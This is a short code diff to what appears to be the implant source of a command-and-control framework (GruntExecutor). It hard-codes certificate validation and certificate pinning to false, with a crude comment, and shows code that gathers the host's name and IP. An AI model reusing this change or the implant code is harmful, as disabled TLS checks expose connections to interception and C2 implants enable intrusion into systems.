@@ -31,8 +31,8 @@ namespace GruntExecutor
 				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
 				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
 				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
+                bool ValidateCert = false; // hard code these mother f'ers
+                bool UseCertPinning = false; // hard code these mother f'ers
 
                 string Hostname = Dns.GetHostName();
                 string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
